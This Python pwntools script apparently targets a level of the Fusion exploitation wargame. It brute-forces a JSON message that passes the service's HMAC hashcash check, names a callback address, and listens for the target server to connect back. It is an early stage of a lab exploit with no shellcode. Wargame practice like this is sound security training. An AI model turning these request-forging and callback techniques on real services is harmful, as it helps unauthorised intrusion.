import random, string, hmac
import hashlib
import json
import struct
import time
import pwn
import sys


RHOST = 'fusion'
RPORT = 20003

def random_string(size=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

def generate_hashcashed_payload(token: str, callback_port: int) -> bytes:
    pwn.log.info('Generating hashcashed payload')
    while (True):
        msg = json.dumps({"tags": [random_string(20)],
                     "title": "Test title",
                     "contents": "Blog post",
                     "serverip": f"192.168.6.1:{callback_port}"})
        payload = token + "\n" + msg
        hashed = hmac.new(token.encode(), payload.encode(), hashlib.sha1)
     
        if hashed.hexdigest()[:4] == "0000":
            payload = payload.encode()
            pwn.log.info("Payload:")
            print(payload)
            pwn.log.info(f"Hash: {hashed.hexdigest()}")
            return payload


def receive_token(io) -> str:
    token: str = io.recvline().decode().split('"')[1]
    pwn.log.info(f"Token: {token}")
    return token
    

def main():
    callback_port = 8081
    callback_listener = pwn.listen(callback_port)
    io = pwn.remote(RHOST, RPORT)

    token = receive_token(io)
    payload: bytes = generate_hashcashed_payload(token, callback_port)

    io.send(payload)
    pwn.log.info('Payload sent!')
    io.close()

    callback_listener.wait_for_connection()
    response = callback_listener.recv()
    pwn.log.info('Received the following response from server:')
    print(response)

if __name__ == "__main__":
    main()
